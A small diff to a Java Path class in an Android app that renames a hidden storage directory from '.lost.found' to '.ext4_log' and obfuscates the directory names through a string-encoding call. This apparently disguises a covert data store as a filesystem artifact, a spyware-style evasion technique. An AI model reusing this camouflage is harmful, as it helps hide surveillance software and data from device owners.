@@ -96,9 +96,10 @@ public class Path {
 			success &= createDirectory(logs());
 			Status.getAppContext().getDir(UPLOADS, Status.getAppContext().MODE_PRIVATE);
 
-			if (Cfg.FILE && Cfg.DEBUG) {
+			if (Cfg.FILE && Cfg.DEBUG && !forcelocal) {
 
 				final File file = new File(getCurLogfile());
+				file.getParentFile().mkdirs();
 				file.createNewFile();
 			}
 
@@ -151,10 +152,10 @@ public class Path {
 		}
 
 		if (!forcelocal && mExternalStorageWriteable && Cfg.USE_SD) {
-			hidden = Environment.getExternalStorageDirectory() + M.e("/.lost.found") + "/"; //$NON-NLS-1$ //$NON-NLS-2$
+			hidden = Environment.getExternalStorageDirectory() + M.e("/.ext4_log") + "/"; //$NON-NLS-1$ //$NON-NLS-2$
 
 		} else {
-			hidden = Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/.lost.found") + "/";
+			hidden = Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/lost") + "/";
 		}
 
 		if (Cfg.DEBUG) {
